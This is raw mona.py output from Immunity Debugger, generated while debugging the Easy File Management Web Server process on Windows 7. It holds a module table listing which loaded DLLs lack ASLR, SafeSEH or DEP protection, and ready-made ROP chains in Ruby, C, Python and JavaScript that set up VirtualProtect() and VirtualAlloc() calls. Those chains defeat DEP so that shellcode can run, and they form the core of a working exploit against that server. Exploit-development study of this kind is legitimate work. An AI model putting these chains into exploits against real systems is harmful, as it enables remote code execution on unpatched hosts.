================================================================================
  Output generated by mona.py v2.0, rev 583 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : fmws (pid 2516)
  Current mona arguments: rop -m *.dll -cp nonull
================================================================================
  2018-10-12 15:08:28
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x00400000 | 0x0062f000 | 0x0022f000 | False  | False   | False |  False   | False  | 5.3.0.0 [fmws.exe] (C:\EFS Software\Easy File Management Web Server\fmws.exe)
 0x10000000 | 0x10050000 | 0x00050000 | False  | False   | False |  False   | False  | -1.0- [ImageLoad.dll] (C:\EFS Software\Easy File Management Web Server\ImageLoad.dll)
 0x75a30000 | 0x75b66000 | 0x00136000 | True   | True    | True  |  True    | True   | 8.00.7600.16385 [urlmon.dll] (C:\Windows\syswow64\urlmon.dll)
 0x746b0000 | 0x746c0000 | 0x00010000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [NLAapi.dll] (C:\Windows\system32\NLAapi.dll)
 0x75910000 | 0x75a2d000 | 0x0011d000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPT32.dll] (C:\Windows\syswow64\CRYPT32.dll)
 0x745f0000 | 0x74634000 | 0x00044000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [DNSAPI.dll] (C:\Windows\system32\DNSAPI.dll)
 0x001c0000 | 0x001e7000 | 0x00027000 | True   | False   | False |  False   | False  | -1.0- [SSLEAY32.dll] (C:\EFS Software\Easy File Management Web Server\SSLEAY32.dll)
 0x76c10000 | 0x76d20000 | 0x00110000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\syswow64\kernel32.dll)
 0x76a60000 | 0x76b0c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\syswow64\msvcrt.dll)
 0x75290000 | 0x7529c000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\syswow64\CRYPTBASE.dll)
 0x74240000 | 0x7425c000 | 0x0001c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [oledlg.dll] (C:\Windows\system32\oledlg.dll)
 0x746c0000 | 0x746d3000 | 0x00013000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x77740000 | 0x778c0000 | 0x00180000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SysWOW64\ntdll.dll)
 0x74680000 | 0x74692000 | 0x00012000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [pnrpnsp.dll] (C:\Windows\system32\pnrpnsp.dll)
 0x756f0000 | 0x75709000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SysWOW64\sechost.dll)
 0x74580000 | 0x74585000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [wshtcpip.dll] (C:\Windows\System32\wshtcpip.dll)
 0x006a0000 | 0x00771000 | 0x000d1000 | True   | False   | False |  False   | False  | -1.0- [LIBEAY32.dll] (C:\EFS Software\Easy File Management Web Server\LIBEAY32.dll)
 0x75900000 | 0x7590a000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\syswow64\LPK.dll)
 0x76860000 | 0x76a5b000 | 0x001fb000 | True   | True    | True  |  True    | True   | 8.00.7601.17514 [iertutil.dll] (C:\Windows\syswow64\iertutil.dll)
 0x75710000 | 0x757ad000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\syswow64\USP10.dll)
 0x74590000 | 0x74596000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rasadhlp.dll] (C:\Windows\system32\rasadhlp.dll)
 0x745a0000 | 0x745d8000 | 0x00038000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [fwpuclnt.dll] (C:\Windows\System32\fwpuclnt.dll)
 0x75090000 | 0x75097000 | 0x00007000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x744b0000 | 0x744b7000 | 0x00007000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WSOCK32.dll] (C:\Windows\system32\WSOCK32.dll)
 0x752a0000 | 0x75300000 | 0x00060000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\Windows\syswow64\SspiCli.dll)
 0x76f20000 | 0x7707c000 | 0x0015c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ole32.dll] (C:\Windows\syswow64\ole32.dll)
 0x76800000 | 0x76860000 | 0x00060000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x74a40000 | 0x74a56000 | 0x00016000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x76b10000 | 0x76c10000 | 0x00100000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\syswow64\USER32.dll)
 0x753b0000 | 0x7542b000 | 0x0007b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [comdlg32.dll] (C:\Windows\syswow64\comdlg32.dll)
 0x750a0000 | 0x750bc000 | 0x0001c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [IPHLPAPI.DLL] (C:\Windows\system32\IPHLPAPI.DLL)
 0x746a0000 | 0x746b0000 | 0x00010000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [napinsp.dll] (C:\Windows\system32\napinsp.dll)
 0x74b70000 | 0x74bf0000 | 0x00080000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x757b0000 | 0x7583f000 | 0x0008f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\Windows\syswow64\OLEAUT32.dll)
 0x75b70000 | 0x767ba000 | 0x00c4a000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\syswow64\SHELL32.dll)
 0x77080000 | 0x77170000 | 0x000f0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\syswow64\RPCRT4.dll)
 0x76d80000 | 0x76d8c000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\Windows\syswow64\MSASN1.dll)
 0x74c00000 | 0x74d9e000 | 0x0019e000 | True   | True    | True  |  True    | True   | 6.10 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\COMCTL32.dll)
 0x745e0000 | 0x745e8000 | 0x00008000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [winrnr.dll] (C:\Windows\System32\winrnr.dll)
 0x755c0000 | 0x756b5000 | 0x000f5000 | True   | True    | True  |  True    | True   | 8.00.7600.16385 [WININET.dll] (C:\Windows\syswow64\WININET.dll)
 0x76d90000 | 0x76de7000 | 0x00057000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SHLWAPI.dll] (C:\Windows\syswow64\SHLWAPI.dll)
 0x75460000 | 0x7552c000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\syswow64\MSCTF.dll)
 0x74210000 | 0x74229000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [OLEPRO32.DLL] (C:\Windows\system32\OLEPRO32.DLL)
 0x76e80000 | 0x76ec6000 | 0x00046000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\syswow64\KERNELBASE.dll)
 0x74640000 | 0x7467c000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSWSOCK.DLL] (C:\Windows\system32\MSWSOCK.DLL)
 0x744c0000 | 0x744f2000 | 0x00032000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINMM.dll] (C:\Windows\system32\WINMM.dll)
 0x76df0000 | 0x76e80000 | 0x00090000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\syswow64\GDI32.dll)
 0x76ed0000 | 0x76f15000 | 0x00045000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WLDAP32.dll] (C:\Windows\syswow64\WLDAP32.dll)
 0x74310000 | 0x74361000 | 0x00051000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINSPOOL.DRV] (C:\Windows\system32\WINSPOOL.DRV)
 0x75310000 | 0x753b0000 | 0x000a0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ADVAPI32.dll] (C:\Windows\syswow64\ADVAPI32.dll)
 0x77710000 | 0x77716000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\syswow64\NSI.dll)
 0x767c0000 | 0x767f5000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.dll] (C:\Windows\syswow64\WS2_32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x757f4049,  # POP ECX # RETN [OLEAUT32.dll] 
      0x76c20928,  # ptr to &VirtualProtect() [IAT kernel32.dll]
      0x7547fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x76a74ee8,  # POP EBP # RETN [msvcrt.dll] 
      0x75abf8ab,  # & jmp esp [urlmon.dll]
      0x76a9a837,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x75c09b64,  # NEG EAX # RETN [SHELL32.dll] 
      0x74c3c5b9,  # MOV EBX,EAX # RETN [COMCTL32.dll] 
      0x76a9aeba,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c09b64,  # NEG EAX # RETN [SHELL32.dll] 
      0x769640f8,  # XCHG EAX,EDX # RETN [iertutil.dll] 
      0x75743f17,  # POP ECX # RETN [USP10.dll] 
      0x7567d0f2,  # &Writable location [WININET.dll]
      0x745f7db6,  # POP EDI # RETN [DNSAPI.dll] 
      0x770e0b8c,  # RETN (ROP NOP) [RPCRT4.dll]
      0x75b74e97,  # POP EAX # RETN [SHELL32.dll] 
      0x90909090,  # nop
      0x76ac5cf4,  # PUSHAD # RETN [msvcrt.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x757f4049,  // POP ECX // RETN [OLEAUT32.dll] 
      0x76c20928,  // ptr to &VirtualProtect() [IAT kernel32.dll]
      0x7547fd52,  // MOV ESI,DWORD PTR DS:[ECX] // ADD DH,DH // RETN [MSCTF.dll] 
      0x76a74ee8,  // POP EBP // RETN [msvcrt.dll] 
      0x75abf8ab,  // & jmp esp [urlmon.dll]
      0x76a9a837,  // POP EAX // RETN [msvcrt.dll] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x75c09b64,  // NEG EAX // RETN [SHELL32.dll] 
      0x74c3c5b9,  // MOV EBX,EAX // RETN [COMCTL32.dll] 
      0x76a9aeba,  // POP EAX // RETN [msvcrt.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x75c09b64,  // NEG EAX // RETN [SHELL32.dll] 
      0x769640f8,  // XCHG EAX,EDX // RETN [iertutil.dll] 
      0x75743f17,  // POP ECX // RETN [USP10.dll] 
      0x7567d0f2,  // &Writable location [WININET.dll]
      0x745f7db6,  // POP EDI // RETN [DNSAPI.dll] 
      0x770e0b8c,  // RETN (ROP NOP) [RPCRT4.dll]
      0x75b74e97,  // POP EAX // RETN [SHELL32.dll] 
      0x90909090,  // nop
      0x76ac5cf4,  // PUSHAD // RETN [msvcrt.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x757f4049,  # POP ECX # RETN [OLEAUT32.dll] 
      0x76c20928,  # ptr to &VirtualProtect() [IAT kernel32.dll]
      0x7547fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x76a74ee8,  # POP EBP # RETN [msvcrt.dll] 
      0x75abf8ab,  # & jmp esp [urlmon.dll]
      0x76a9a837,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x75c09b64,  # NEG EAX # RETN [SHELL32.dll] 
      0x74c3c5b9,  # MOV EBX,EAX # RETN [COMCTL32.dll] 
      0x76a9aeba,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c09b64,  # NEG EAX # RETN [SHELL32.dll] 
      0x769640f8,  # XCHG EAX,EDX # RETN [iertutil.dll] 
      0x75743f17,  # POP ECX # RETN [USP10.dll] 
      0x7567d0f2,  # &Writable location [WININET.dll]
      0x745f7db6,  # POP EDI # RETN [DNSAPI.dll] 
      0x770e0b8c,  # RETN (ROP NOP) [RPCRT4.dll]
      0x75b74e97,  # POP EAX # RETN [SHELL32.dll] 
      0x90909090,  # nop
      0x76ac5cf4,  # PUSHAD # RETN [msvcrt.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u4049%u757f" + // 0x757f4049 : ,# POP ECX # RETN [OLEAUT32.dll] 
    "%u0928%u76c2" + // 0x76c20928 : ,# ptr to &VirtualProtect() [IAT kernel32.dll]
    "%ufd52%u7547" + // 0x7547fd52 : ,# MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
    "%u4ee8%u76a7" + // 0x76a74ee8 : ,# POP EBP # RETN [msvcrt.dll] 
    "%uf8ab%u75ab" + // 0x75abf8ab : ,# & jmp esp [urlmon.dll]
    "%ua837%u76a9" + // 0x76a9a837 : ,# POP EAX # RETN [msvcrt.dll] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u9b64%u75c0" + // 0x75c09b64 : ,# NEG EAX # RETN [SHELL32.dll] 
    "%uc5b9%u74c3" + // 0x74c3c5b9 : ,# MOV EBX,EAX # RETN [COMCTL32.dll] 
    "%uaeba%u76a9" + // 0x76a9aeba : ,# POP EAX # RETN [msvcrt.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u9b64%u75c0" + // 0x75c09b64 : ,# NEG EAX # RETN [SHELL32.dll] 
    "%u40f8%u7696" + // 0x769640f8 : ,# XCHG EAX,EDX # RETN [iertutil.dll] 
    "%u3f17%u7574" + // 0x75743f17 : ,# POP ECX # RETN [USP10.dll] 
    "%ud0f2%u7567" + // 0x7567d0f2 : ,# &Writable location [WININET.dll]
    "%u7db6%u745f" + // 0x745f7db6 : ,# POP EDI # RETN [DNSAPI.dll] 
    "%u0b8c%u770e" + // 0x770e0b8c : ,# RETN (ROP NOP) [RPCRT4.dll]
    "%u4e97%u75b7" + // 0x75b74e97 : ,# POP EAX # RETN [SHELL32.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%u5cf4%u76ac" + // 0x76ac5cf4 : ,# PUSHAD # RETN [msvcrt.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x755c20b1,  # POP ECX # RETN [WININET.dll] 
      0x1004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]
      0x7547fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x75adc9e2,  # POP EBP # RETN [urlmon.dll] 
      0x75ac3512,  # & jmp esp [urlmon.dll]
      0x75e23893,  # POP EAX # RETN [SHELL32.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x755c25cc,  # NEG EAX # RETN [WININET.dll] 
      0x74c3c5b9,  # MOV EBX,EAX # RETN [COMCTL32.dll] 
      0x76aa28a8,  # POP ECX # RETN [msvcrt.dll] 
      0xa139848c,  # put delta into ecx (-> put 0x00001000 into edx)
      0x74c181d1,  # ADD ECX,5EC68B74 # POP EBP # RETN 0x04 [COMCTL32.dll] 
      0x41414141,  # Filler (compensate)
      0x76ac615a,  # MOV EDX,ECX # POP EBP # RETN [msvcrt.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      0x76c357ec,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75462fd0,  # NEG EAX # RETN [MSCTF.dll] 
      0x76c38179,  # XCHG EAX,ECX # RETN [kernel32.dll] 
      0x76fbabe1,  # POP EDI # RETN [ole32.dll] 
      0x770e0b8c,  # RETN (ROP NOP) [RPCRT4.dll]
      0x76a9aeba,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x74c7c1f1,  # PUSHAD # RETN [COMCTL32.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x755c20b1,  // POP ECX // RETN [WININET.dll] 
      0x1004d1fc,  // ptr to &VirtualAlloc() [IAT ImageLoad.dll]
      0x7547fd52,  // MOV ESI,DWORD PTR DS:[ECX] // ADD DH,DH // RETN [MSCTF.dll] 
      0x75adc9e2,  // POP EBP // RETN [urlmon.dll] 
      0x75ac3512,  // & jmp esp [urlmon.dll]
      0x75e23893,  // POP EAX // RETN [SHELL32.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x755c25cc,  // NEG EAX // RETN [WININET.dll] 
      0x74c3c5b9,  // MOV EBX,EAX // RETN [COMCTL32.dll] 
      0x76aa28a8,  // POP ECX // RETN [msvcrt.dll] 
      0xa139848c,  // put delta into ecx (-> put 0x00001000 into edx)
      0x74c181d1,  // ADD ECX,5EC68B74 // POP EBP // RETN 0x04 [COMCTL32.dll] 
      0x41414141,  // Filler (compensate)
      0x76ac615a,  // MOV EDX,ECX // POP EBP // RETN [msvcrt.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (compensate)
      0x76c357ec,  // POP EAX // RETN [kernel32.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x75462fd0,  // NEG EAX // RETN [MSCTF.dll] 
      0x76c38179,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x76fbabe1,  // POP EDI // RETN [ole32.dll] 
      0x770e0b8c,  // RETN (ROP NOP) [RPCRT4.dll]
      0x76a9aeba,  // POP EAX // RETN [msvcrt.dll] 
      0x90909090,  // nop
      0x74c7c1f1,  // PUSHAD // RETN [COMCTL32.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x755c20b1,  # POP ECX # RETN [WININET.dll] 
      0x1004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]
      0x7547fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x75adc9e2,  # POP EBP # RETN [urlmon.dll] 
      0x75ac3512,  # & jmp esp [urlmon.dll]
      0x75e23893,  # POP EAX # RETN [SHELL32.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x755c25cc,  # NEG EAX # RETN [WININET.dll] 
      0x74c3c5b9,  # MOV EBX,EAX # RETN [COMCTL32.dll] 
      0x76aa28a8,  # POP ECX # RETN [msvcrt.dll] 
      0xa139848c,  # put delta into ecx (-> put 0x00001000 into edx)
      0x74c181d1,  # ADD ECX,5EC68B74 # POP EBP # RETN 0x04 [COMCTL32.dll] 
      0x41414141,  # Filler (compensate)
      0x76ac615a,  # MOV EDX,ECX # POP EBP # RETN [msvcrt.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      0x76c357ec,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75462fd0,  # NEG EAX # RETN [MSCTF.dll] 
      0x76c38179,  # XCHG EAX,ECX # RETN [kernel32.dll] 
      0x76fbabe1,  # POP EDI # RETN [ole32.dll] 
      0x770e0b8c,  # RETN (ROP NOP) [RPCRT4.dll]
      0x76a9aeba,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x74c7c1f1,  # PUSHAD # RETN [COMCTL32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u20b1%u755c" + // 0x755c20b1 : ,# POP ECX # RETN [WININET.dll] 
    "%ud1fc%u1004" + // 0x1004d1fc : ,# ptr to &VirtualAlloc() [IAT ImageLoad.dll]
    "%ufd52%u7547" + // 0x7547fd52 : ,# MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
    "%uc9e2%u75ad" + // 0x75adc9e2 : ,# POP EBP # RETN [urlmon.dll] 
    "%u3512%u75ac" + // 0x75ac3512 : ,# & jmp esp [urlmon.dll]
    "%u3893%u75e2" + // 0x75e23893 : ,# POP EAX # RETN [SHELL32.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u25cc%u755c" + // 0x755c25cc : ,# NEG EAX # RETN [WININET.dll] 
    "%uc5b9%u74c3" + // 0x74c3c5b9 : ,# MOV EBX,EAX # RETN [COMCTL32.dll] 
    "%u28a8%u76aa" + // 0x76aa28a8 : ,# POP ECX # RETN [msvcrt.dll] 
    "%u848c%ua139" + // 0xa139848c : ,# put delta into ecx (-> put 0x00001000 into edx)
    "%u81d1%u74c1" + // 0x74c181d1 : ,# ADD ECX,5EC68B74 # POP EBP # RETN 0x04 [COMCTL32.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u615a%u76ac" + // 0x76ac615a : ,# MOV EDX,ECX # POP EBP # RETN [msvcrt.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u57ec%u76c3" + // 0x76c357ec : ,# POP EAX # RETN [kernel32.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u2fd0%u7546" + // 0x75462fd0 : ,# NEG EAX # RETN [MSCTF.dll] 
    "%u8179%u76c3" + // 0x76c38179 : ,# XCHG EAX,ECX # RETN [kernel32.dll] 
    "%uabe1%u76fb" + // 0x76fbabe1 : ,# POP EDI # RETN [ole32.dll] 
    "%u0b8c%u770e" + // 0x770e0b8c : ,# RETN (ROP NOP) [RPCRT4.dll]
    "%uaeba%u76a9" + // 0x76a9aeba : ,# POP EAX # RETN [msvcrt.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%uc1f1%u74c7" + // 0x74c7c1f1 : ,# PUSHAD # RETN [COMCTL32.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

